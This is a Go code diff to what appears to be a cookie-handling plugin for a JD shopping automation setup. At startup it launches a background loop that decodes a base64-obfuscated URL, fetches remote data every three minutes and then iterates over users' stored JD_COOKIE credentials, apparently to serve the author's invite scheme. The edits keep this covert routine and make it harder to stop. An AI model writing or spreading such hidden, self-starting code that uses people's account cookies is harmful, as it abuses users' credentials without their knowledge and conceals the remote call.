@@ -12,7 +12,7 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
-// to help the author or do not use this script
+// to help poor author or do not use this script
 func init() {
 	core.Server.GET("/gxfc", func(c *gin.Context) {
 		c.String(200, jd_cookie.Get("dyj_inviteInfo", "恭喜发财！"))
@@ -28,8 +28,8 @@ func init() {
 		},
 	})
 	go func() {
-	start:
 		for {
+		start:
 			time.Sleep(time.Minute * 3)
 			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
 			data, _ := httplib.Get(string(decoded)).String()
@@ -43,7 +43,7 @@ func init() {
 				jd_cookie.Set("dyj_data", data)
 				envs, err := qinglong.GetEnvs("JD_COOKIE")
 				if err != nil {
-					break
+					continue
 				}
 				s := 1
 				for i := 0; i < len(envs); i++ {
@@ -60,7 +60,6 @@ func init() {
 							if s == 1 {
 								s = 2
 							} else {
-
 								goto start
 							}
 						}
